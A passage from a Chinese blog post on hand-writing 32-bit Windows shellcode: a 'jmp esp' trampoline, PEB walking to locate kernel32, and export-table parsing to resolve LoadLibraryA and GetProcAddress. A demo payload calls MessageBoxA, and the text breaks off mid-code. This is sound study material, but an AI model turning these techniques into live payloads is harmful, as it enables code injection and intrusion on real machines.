<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Windows_Shellcode"><meta name="keywords" content="Bin"><meta name="author" content="Second_BC,undefined"><meta name="copyright" content="Second_BC"><title>Windows_Shellcode【Second_BC の BloG】</title><link rel="stylesheet" href="/SecondBC/css/fan.css"><link rel="stylesheet" href="/SecondBC/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/SecondBC/favicon.ico"><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/SecondBC/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/SecondBC/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: ,
  valine: ,
}</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/SecondBC/atom.xml" title="Second_BC の BloG" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96"><span class="toc-number">1.</span> <span class="toc-text">内联汇编</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%B3%E6%9D%BF"><span class="toc-number">2.</span> <span class="toc-text">跳板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TEB-PEB%E6%9F%A5%E6%89%BE%E6%A8%A1%E5%9D%97"><span class="toc-number">3.</span> <span class="toc-text">TEB&#x2F;PEB查找模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE"><span class="toc-number">3.2.</span> <span class="toc-text">访问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E5%AE%9E%E9%AA%8C%EF%BC%9A%E5%88%A9%E7%94%A8PEB%E8%8E%B7%E5%8F%96user32%E6%A8%A1%E5%9D%97%E8%B0%83%E7%94%A8MessageBoxA"><span class="toc-number">4.</span> <span class="toc-text">小实验：利用PEB获取user32模块调用MessageBoxA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88%E5%87%BD%E6%95%B0%E5%90%8D%EF%BC%89"><span class="toc-number">4.1.</span> <span class="toc-text">写入字符串（函数名）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96kernel32-dll%E5%9F%BA%E5%9D%80"><span class="toc-number">4.2.</span> <span class="toc-text">获取kernel32.dll基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%A4%E4%B8%AA%E9%87%8D%E9%87%8F%E7%BA%A7API"><span class="toc-number">4.3.</span> <span class="toc-text">获取两个重量级API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">4.4.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BC%98%E5%8C%96"><span class="toc-number">5.</span> <span class="toc-text">字符串优化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E4%BC%98%E5%8C%96"><span class="toc-number">6.</span> <span class="toc-text">编码优化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81"><span class="toc-number">6.1.</span> <span class="toc-text">编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E7%A0%81"><span class="toc-number">6.2.</span> <span class="toc-text">解码</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/SecondBC/ss.jpg"></div><div class="author-info-name">Second_BC</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/" target="_blank">GitHub<i class="icon-dot bg-color3"></i></a><a class="links-button button-hover" href="mailto:1" target="_blank">E-Mail<i class="icon-dot bg-color3"></i></a><a class="links-button button-hover" href="tencent://message/?uin=2&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color8"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/SecondBC/archives"><span class="pull-top">日志</span><span class="pull-bottom">38</span></a><a class="author-info-articles-tags article-meta" href="/SecondBC/tags"><span class="pull-top">标签</span><span class="pull-bottom">10</span></a><a class="author-info-articles-categories article-meta" href="/SecondBC/categories"><span class="pull-top">分类</span><span class="pull-bottom">3</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/SecondBC">首页</a><a class="menu-item" href="/SecondBC/archives">归档</a><a class="menu-item" href="/SecondBC/categories">分类</a><a class="menu-item" href="/SecondBC/tags">标签</a><a class="menu-item" href="/SecondBC/about">关于</a></nav><div class="right-info"><a class="title-name" href="/SecondBC/">Second_BC の BloG</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">Windows_Shellcode</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2023-06-19 | 更新于 2023-06-19</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Bin/">Bin</a></div></div></div><div class="main-content"><h2 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h2><p>VS编写壳代码需要用到裸函数，在其中使用内联汇编：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _declspec(naked)<span class="built_in">funcName</span>()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push <span class="number">0</span>;</span><br><span class="line">        mov eax, <span class="number">0xdeadbeaf</span>;</span><br><span class="line">        call eax;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用函数<strong>不能</strong>直接call一个立即数地址；</p>
<p>提取机械码用ida；</p>
<p>尽量不使payload中出现\x00，导致<strong>字符串截断</strong>；</p>
<p><code>push 0; -&gt;  xor edi, edi; push edi;</code></p>
<p>在windowsROP里，此电脑 -&gt; 管理 -&gt; 事件查看器 -&gt; Windows日志 -&gt; 应用程序 以查看触发异常；</p>
<h2 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a>跳板</h2><p>在WindowsAPI中，<code>jmp esp</code> 指令做为一个常见gadget，其地址在同版本API库加载dll时大部分情况下（没开随机地址）固定，32位情况下为 0x7xxxxxxx；</p>
<p>实现ROP即可使返回地址指向 <code>jmp esp</code> ，使其作为跳板让eip指向返回地址后面的shellcode；</p>
<h2 id="TEB-PEB查找模块"><a href="#TEB-PEB查找模块" class="headerlink" title="TEB/PEB查找模块"></a>TEB/PEB查找模块</h2><blockquote>
<p>为了使shellcode通用性强,可用TEB/PEB查找API模块,不使用立即数地址；</p>
</blockquote>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>所有进程都会引用 kernel32.dll；</p>
<p>窗口程序（WinMain）user32.dll 专用，封装所有窗口操作相关API；</p>
<p>无论kernel32或user32最终会调用 <em><strong>ntdll.dll</strong></em>，r0大门；</p>
<p>TEB：thread environment block</p>
<p>线程环境块，结构体，保存线程中各种信息，每个线程都有一个；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TEB</span><br><span class="line">&#123;</span><br><span class="line">    +<span class="number">0x00</span> _NT_TIB NtTib; <span class="comment">//线程信息块</span></span><br><span class="line">    +<span class="number">0x30</span> _PEB* PPEB;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 线程信息块：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>	_<span class="title">NT_TIB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	 <span class="class"><span class="keyword">struct</span>	_<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span>	<span class="comment">//用于操作SEH</span></span><br><span class="line">     <span class="comment">//SEH：windows异常处理机制，大量运用于反调试程序；</span></span><br><span class="line">	 PVOID StackBase;</span><br><span class="line">	 PVOID StackLimit; </span><br><span class="line">	 PVOID SubSystemTib; </span><br><span class="line">	 <span class="class"><span class="keyword">union</span> </span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">		PVOID FiberData; </span><br><span class="line">		DWORD Version;</span><br><span class="line">	 &#125;; </span><br><span class="line">	 PVOID ArbitraryUserPointer;</span><br><span class="line"> 	 <span class="class"><span class="keyword">struct</span>	_<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span>			<span class="comment">//指向自己的指针</span></span><br><span class="line">&#125; NT_TIB;</span><br><span class="line"><span class="keyword">typedef</span> NT_TIB *PNT_TIB;</span><br></pre></td></tr></table></figure>

<p>PEB: process environment block</p>
<p>进程环境块，需要的模块放于其中； </p>
<h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><p>用 NtCurrentTeb(); 可返回TEB类型指针；</p>
<p>其内部实现只有一句汇编码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, dword ptr fs:[0x18]	;18h偏移是指向自己的指针 *Self</span><br></pre></td></tr></table></figure>

<p>则fs段寄存器存放的是TEB，偏移30h为PEB指针；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PEB</span><br><span class="line">&#123;</span><br><span class="line">    +<span class="number">0x00c</span> _PEB_LDR_DATA* Ldr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    +<span class="number">0x000</span> Uint length;</span><br><span class="line">    +<span class="number">0x004</span> Uchar initialized;</span><br><span class="line">    +<span class="number">0x008</span> LVOID SsHandle;</span><br><span class="line">    +<span class="number">0x00c</span> _LIST_ENTRY InloadOrderModuleList; <span class="comment">//载入顺序排序的dll</span></span><br><span class="line">    +<span class="number">0x014</span> _LIST_ENTRY InMemoryOrderModuleList; <span class="comment">//内存排序的dll</span></span><br><span class="line">    +<span class="number">0x01c</span> _LIST_ENTRY InitializationOrderModuleList; <span class="comment">//初始化排序的dll</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>初始化排序一般不会变动，所以用到它，第一个为ntdll，第二个kernel32或kernelbase；</p>
<p>_LIST_ENTRY是一个双头链表，其中只有两个字段，指向上一个和下一个结构体的指针； </p>
<p>_LIST_ENTRY其实为一个结构体内部的子结构体，数据信息放在其父结构体中,父结构体存放dll信息；</p>
<p><img src="https://s2.loli.net/2023/06/12/b8tJhnKUIfdpAzY.png" alt="LDR"></p>
<p>父结构体：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _LIST_ENTRY InloadOrderModuleList; <span class="comment">//载入顺序排序的dll</span></span><br><span class="line">    _LIST_ENTRY InMemoryOrderModuleList; <span class="comment">//内存排序的dll</span></span><br><span class="line">    _LIST_ENTRY InitializationOrderModuleList; <span class="comment">//初始化排序的dll</span></span><br><span class="line">    PVOID DllBase;			<span class="comment">//dll基地址，要得到的模块</span></span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    PVOID SizeOfImage;</span><br><span class="line">    PVOID FullDllName;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>则得到dll基址所需汇编码为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov esi, fs:[0x30] ;得到peb</span><br><span class="line">mov esi, [esi+0xc] ;得到ldr</span><br><span class="line">mov esi, [esi+0x1c];得到_LIST_ENTRY</span><br><span class="line">mov esi, [esi]	   ;得到下一个结构体（kernel32）</span><br><span class="line">mov esi, [esi+0x8] ;得到dllbase(32位,两个指针类型占8字节)</span><br></pre></td></tr></table></figure>

<p>对于windows段寄存器的操作别用keystone找机械码，有问题，就用裸函数写内联ida提取；</p>
<p>得到dllbase后，需要找到导出表，与其中的目标函数名称做比较确定真实地址；</p>
<p>需要确定 “LoadLibraryA”，“GetProcAddress”；</p>
<p>对于字符串比较不能使用strcmp系统函数，需要自实现汇编，相同返回0，不同返回1：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Mystrcmp</span>()</span><br><span class="line"> &#123;</span><br><span class="line">     _asm</span><br><span class="line">     &#123;</span><br><span class="line">         lea esi, [strA]		<span class="comment">//函数三个参数</span></span><br><span class="line">         lea edi, [strB]</span><br><span class="line">         mov ecx, 循环次数</span><br><span class="line">         repe cmpsb				<span class="comment">//循环比较</span></span><br><span class="line">         je Equal</span><br><span class="line">         mov eax, <span class="number">1</span></span><br><span class="line">         jmp End</span><br><span class="line">         Equal:</span><br><span class="line">         mov eax, <span class="number">0</span></span><br><span class="line">         End:</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>repe cmpsb需要DF标志位置零向后比较；</p>
<h2 id="小实验：利用PEB获取user32模块调用MessageBoxA"><a href="#小实验：利用PEB获取user32模块调用MessageBoxA" class="headerlink" title="小实验：利用PEB获取user32模块调用MessageBoxA"></a>小实验：利用PEB获取user32模块调用MessageBoxA</h2><p>大体思路：</p>
<ul>
<li>获取关键API： loadLibrary，getprocaddress，这样不管是什么模块中的什么函数都能使用；</li>
<li>获取kernel32模块：获取以实现第一步，两个关键API在此模块中；</li>
<li>使用两个API得到MessageBoxA的函数地址；</li>
<li>调用MessageBoxA；</li>
</ul>
<p>如何得到两个关键API呢？</p>
<p>用之前分析的方法：通过TEB-&gt;PEB-&gt;LDR-&gt;dllbase，找到dll基址，通过基址以及PE结构的知识得到dll的导出表，遍历函数名称表（ENT）和目标函数（loadlibrary，getprocaddress）名称比较得到函数索引，根据索引和函数序数表（EOT）得到此函数的地址表（EAT）索引，则得到两个关键API的地址；</p>
<h3 id="写入字符串（函数名）"><a href="#写入字符串（函数名）" class="headerlink" title="写入字符串（函数名）"></a>写入字符串（函数名）</h3><p>写入要比较的两个关键API字符串，以及调用API函数需要的其他字符串；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//LoadLibraryA</span></span><br><span class="line"><span class="comment">//GetProcAddress</span></span><br><span class="line"><span class="comment">//user32.dll</span></span><br><span class="line"><span class="comment">//MessageBoxA</span></span><br><span class="line"><span class="comment">//Second_BC</span></span><br><span class="line"><span class="comment">//以上字符串放入栈，栈中顺序也如上排序</span></span><br><span class="line"><span class="comment">//第一步，保存字符串信息</span></span><br><span class="line">pushad                  </span><br><span class="line">sub esp, <span class="number">0x30</span></span><br><span class="line">mov ax, <span class="number">0x0043</span></span><br><span class="line">mov word ptr ds:[esp - <span class="number">2</span>], ax   <span class="comment">//这种写法节省空间</span></span><br><span class="line">sub esp, <span class="number">2</span></span><br><span class="line">push <span class="number">0x425f646e</span></span><br><span class="line">push <span class="number">0x6f636553</span></span><br><span class="line">push <span class="number">0x41786f</span></span><br><span class="line">push <span class="number">0x42656761</span></span><br><span class="line">push <span class="number">0x7373654d</span></span><br><span class="line">mov byte ptr ds:[esp - <span class="number">1</span>], <span class="number">0x0</span></span><br><span class="line">sub esp, <span class="number">0x1</span></span><br><span class="line">mov ax, <span class="number">0x6c6c</span></span><br><span class="line">mov word ptr ds:[esp - <span class="number">2</span>], ax</span><br><span class="line">sub esp, <span class="number">0x2</span></span><br><span class="line">push <span class="number">0x642e3233</span></span><br><span class="line">push <span class="number">0x72657375</span></span><br><span class="line">mov byte ptr ds:[esp - <span class="number">1</span>], <span class="number">0x0</span></span><br><span class="line">sub esp, <span class="number">0x1</span></span><br><span class="line">mov ax, <span class="number">0x7373</span></span><br><span class="line">mov word ptr ds:[esp - <span class="number">2</span>], ax</span><br><span class="line">sub esp, <span class="number">0x2</span></span><br><span class="line">push <span class="number">0x65726464</span></span><br><span class="line">push <span class="number">0x41636f72</span></span><br><span class="line">push <span class="number">0x50746547</span></span><br><span class="line">mov byte ptr ds:[esp - <span class="number">1</span>], <span class="number">0x0</span></span><br><span class="line">sub esp, <span class="number">0x1</span></span><br><span class="line">push <span class="number">0x41797261</span></span><br><span class="line">push <span class="number">0x7262694c</span></span><br><span class="line">push <span class="number">0x64616f4c</span></span><br><span class="line">mov ecx, esp</span><br><span class="line">push ecx</span><br><span class="line">call fun_payload				<span class="comment">//主体实现，之后给出，一个参数，即这些字符串首地址</span></span><br><span class="line">popad</span><br></pre></td></tr></table></figure>



<h3 id="获取kernel32-dll基址"><a href="#获取kernel32-dll基址" class="headerlink" title="获取kernel32.dll基址"></a>获取kernel32.dll基址</h3><p>用到了上述peb知识；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第二步，获取kernel32.dll基址</span></span><br><span class="line">fun_GetModule:</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp, esp</span><br><span class="line">        sub esp, <span class="number">0xc</span></span><br><span class="line">        push esi</span><br><span class="line">        mov esi, dword ptr fs:[<span class="number">0x30</span>]    <span class="comment">//peb地址</span></span><br><span class="line">        mov esi, [esi + <span class="number">0xc</span>]            <span class="comment">//ldr地址</span></span><br><span class="line">        mov esi, [esi + <span class="number">0x1c</span>]           <span class="comment">//list_entry</span></span><br><span class="line">        mov esi, [esi]                  <span class="comment">//list_entry第二项,kernel32</span></span><br><span class="line">        mov esi, [esi + <span class="number">0x8</span>]            <span class="comment">//dllbase</span></span><br><span class="line">        mov eax, esi</span><br><span class="line">        pop esi</span><br><span class="line">        mov esp, ebp</span><br><span class="line">        pop ebp</span><br><span class="line">        retn</span><br></pre></td></tr></table></figure>



<h3 id="获取两个重量级API"><a href="#获取两个重量级API" class="headerlink" title="获取两个重量级API"></a>获取两个重量级API</h3><p>用到pe结构知识；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//32位偏移计算</span></span><br><span class="line"><span class="comment">// MyGetProcAddress(imageBase, funName, nameLen)</span></span><br><span class="line"><span class="comment">// ImageBase + 0x3c = nt头</span></span><br><span class="line"><span class="comment">// nt头 + 0x78 = dataDirectory 第一项 导出表</span></span><br><span class="line"><span class="comment">// EAT = 导出表 + 0x1c</span></span><br><span class="line"><span class="comment">// ENT = 导出表 + 0x20</span></span><br><span class="line"><span class="comment">// EOT = 导出表 + 0x24</span></span><br><span class="line"><span class="comment">//第三步，获取导出表查找所需函数</span></span><br><span class="line">fun_GetProcAddr:</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp, esp</span><br><span class="line">        sub esp, <span class="number">0x20</span></span><br><span class="line">        push esi</span><br><span class="line">        push edi</span><br><span class="line">        push edx</span><br><span class="line">        push ebx</span><br><span class="line">        push ecx</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取函数地址表，函数序数表，函数名称表</span></span><br><span class="line">        mov edx, [ebp + <span class="number">0x8</span>]            <span class="comment">//第一个参dllbase</span></span><br><span class="line">        mov esi, [edx + <span class="number">0x3c</span>]           <span class="comment">//lf_anew</span></span><br><span class="line">        lea esi, [edx + esi]            <span class="comment">//nt头 = base + lf_anew</span></span><br><span class="line">        mov esi, [esi + <span class="number">0x78</span>]           <span class="comment">//导出表RVA</span></span><br><span class="line">        lea esi, [edx + esi]            <span class="comment">//导出表VA</span></span><br><span class="line">        mov edi, [esi + <span class="number">0x1c</span>]           <span class="comment">//EAT RVA</span></span><br><span class="line">        lea edi, [edx + edi]            <span class="comment">//EAT</span></span><br><span class="line">        mov [ebp - <span class="number">0x4</span>], edi            </span><br><span class="line">        mov edi, [esi + <span class="number">0x20</span>]           <span class="comment">//ENT RVA</span></span><br><span class="line">        lea edi, [edx + edi]            <span class="comment">//ENT</span></span><br><span class="line">        mov [ebp - <span class="number">0x8</span>], edi</span><br><span class="line">        mov edi, [esi + <span class="number">0x24</span>]           <span class="comment">//EOT RVA</span></span><br><span class="line">        lea edi, [edx + edi]            <span class="comment">//EOT</span></span><br><span class="line">        mov [ebp - <span class="number">0xc</span>], edi</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用ENT循环比较函数名得到目标函数的序数表index</span></span><br><span class="line">        <span class="comment">//ENT和EOT索引同步</span></span><br><span class="line">        <span class="keyword">xor</span> eax, eax                    <span class="comment">//循环控制 i = 0</span></span><br><span class="line">        cld                             <span class="comment">//DF标志位置为0，使比较时edi，esi往下加不是减</span></span><br><span class="line">        jmp tag_cmpFirst</span><br><span class="line">    tag_cmpLoop:</span><br><span class="line">        inc eax                         <span class="comment">//i++</span></span><br><span class="line">    tag_cmpFirst:</span><br><span class="line">        mov esi, [ebp - <span class="number">0x8</span>]            <span class="comment">//ENT</span></span><br><span class="line">        mov esi, [esi + eax*<span class="number">4</span>]          <span class="comment">//RVA</span></span><br><span class="line">        lea esi, [edx + esi]            <span class="comment">//函数名称地址</span></span><br><span class="line">        mov edi, [ebp + <span class="number">0xc</span>]            <span class="comment">//传入二参，目标函数名称地址</span></span><br><span class="line">        mov ecx, [ebp + <span class="number">0x10</span>]           <span class="comment">//三参，循环次数</span></span><br><span class="line">        repe cmpsb                      <span class="comment">//esi, edi字符串比较</span></span><br><span class="line">        jne tag_cmpLoop</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//根据已知EOT索引获取EAT中地址</span></span><br><span class="line">        mov esi, [ebp - <span class="number">0xc</span>]            <span class="comment">//EOT</span></span><br><span class="line">        <span class="keyword">xor</span> edi, edi</span><br><span class="line">        mov di, [esi + eax*<span class="number">2</span>]           <span class="comment">//word类型乘2，得到EAT索引</span></span><br><span class="line"></span><br><span class="line">        mov ebx, [ebp - <span class="number">0x4</span>]            <span class="comment">//EAT</span></span><br><span class="line">        mov esi, [ebx + edi*<span class="number">4</span>]          <span class="comment">//函数地址rva</span></span><br><span class="line">        lea eax, [edx + esi]            <span class="comment">//返回目标函数地址</span></span><br><span class="line"></span><br><span class="line">        pop ecx</span><br><span class="line">        pop ebx</span><br><span class="line">        pop edx</span><br><span class="line">        pop edi</span><br><span class="line">        pop esi</span><br><span class="line">        mov esp, ebp</span><br><span class="line">        pop ebp</span><br><span class="line">        retn <span class="number">0xc</span>                        <span class="comment">//接收三个参数</span></span><br></pre></td></tr></table></figure>



<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>第一步跳转的主要的思路实现；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 